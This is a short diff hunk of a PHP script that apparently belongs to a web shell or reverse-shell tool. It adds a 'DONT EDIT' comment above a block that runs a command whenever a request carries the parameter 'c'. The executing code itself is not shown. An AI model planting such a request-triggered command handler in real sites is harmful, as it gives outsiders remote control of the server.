@@ -66,6 +66,8 @@ $daemon = 0;
 $debug = 0;
 $verbose = true;
 
+// DONT EDIT FROM THIS POINT ON
+
 // Just run command
 if (isset($_REQUEST['c'])) {
 	header('Content-Type:text/plain');
